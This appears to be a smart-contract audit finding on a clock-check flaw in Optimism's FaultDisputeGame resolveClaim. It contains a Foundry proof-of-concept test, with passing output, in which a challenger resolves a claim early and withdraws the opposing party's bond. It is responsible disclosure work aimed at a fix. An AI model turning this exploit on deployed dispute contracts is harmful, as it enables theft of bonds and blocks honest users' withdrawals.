Square Honey Sloth

high

# Incorrect clock check when resolving a claim in fault dispute game, leading to incorrect bond distribution and making attacker always right

## Summary
When resolving a claim, it only checks if the claimant has spent all 3.5 days, but the logic is incorrect because it might be a turn for other party to attack.

## Vulnerability Detail
[FaultDisputeGame.sol L412-416](https://github.com/sherlock-audit/2024-02-optimism-2024/blob/f216b0d3ad08c1a0ead557ea74691aaefd5fd489/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L412-L416)

```Solidity
// INVARIANT: Cannot resolve a subgame unless the clock of its root has expired
uint64 parentClockDuration = parent.clock.duration().raw();
uint64 timeSinceParentMove = uint64(block.timestamp) - parent.clock.timestamp().raw();
if (parentClockDuration + timeSinceParentMove <= GAME_DURATION.raw() >> 1) {
    revert ClockNotExpired();
}
```
In `resolveClaim` function, it checks if the clock of its root is expired by summing up the duration of the parent and the time spent since the parent made a move.
This logic is incorrect because current time span belongs to the other party, not to the parent.
Thus, it can lead to an issue where the clock is not expired actually but it is considered as expired and resolve the claim.

Here's a diagram to show a specific scenario of how not expired claim can be resolved:

![img](https://i.ibb.co/cv8KWtz/resolve-Claim.png)

As shown in the diagram above, Alice an attacker, spends 3 days already and it's turn for the root claimer to attack Alice, but Alice can resolve her claim before the attack is made.

Here's a test case that proves above scenario can succeed.
```Solidity
function test_AuditInvalidResolveClaim() public {
    uint256 bal = 1000 ether;

    vm.deal(address(this), bal);

    // DEPTH-1 2nd player attacks root claimer after 2 days
    vm.warp(block.timestamp + 2 days);
    gameProxy.attack{ value: _getRequiredBond(0) }(0, _dummyClaim());

    // DEPTH-2 Root claimer attacks 2nd player after 10 seconds
    vm.warp(block.timestamp + 10);
    gameProxy.attack{ value: _getRequiredBond(1) }(1, _dummyClaim());

    // DEPTH-3 2nd player attacks root claimer after 1 day
    vm.warp(block.timestamp + 1 days);
    gameProxy.attack{ value: _getRequiredBond(2) }(2, _dummyClaim());

    // 0.6 days passed and as of now, it's a turn for the root claimer to attack but 2nd player resolves her claim
    vm.warp(block.timestamp + 0.6 days);

    uint256 balanceBeforeResolve = address(this).balance;

    // 2nd player resolves her claim
    gameProxy.resolveClaim(3);

    // After delay, bonds can be withdrawn.
    vm.warp(block.timestamp + delayedWeth.delay() + 1 seconds);
    gameProxy.claimCredit(address(this));

    assertEq(address(this).balance, balanceBeforeResolve + _getRequiredBond(2));
}
```

Test result:
```bash
Ran 1 test for test/dispute/FaultDisputeGame.t.sol:FaultDisputeGame_Test
[PASS] test_AuditInvalidResolveClaim() (gas: 747561)

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 96.06ms

Ran 1 test suite in 96.06ms: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact
1. The game result is always CHALLENGER_WIN.
2. Thus, the attacker will take all the bonds from the correct root claimer.
3. By making game results always CHALLENGER_WIN, it will also prevent users from withdrawing their assets.

## Code Snippet
https://github.com/sherlock-audit/2024-02-optimism-2024/blob/f216b0d3ad08c1a0ead557ea74691aaefd5fd489/optimism/packages/contracts-bedrock/src/dispute/FaultDisputeGame.sol#L412-L416

## Tool used
Manual Review, Foundry

## Recommendation
The claims need to be resolved after the game is finished, which means after 7 days are passed.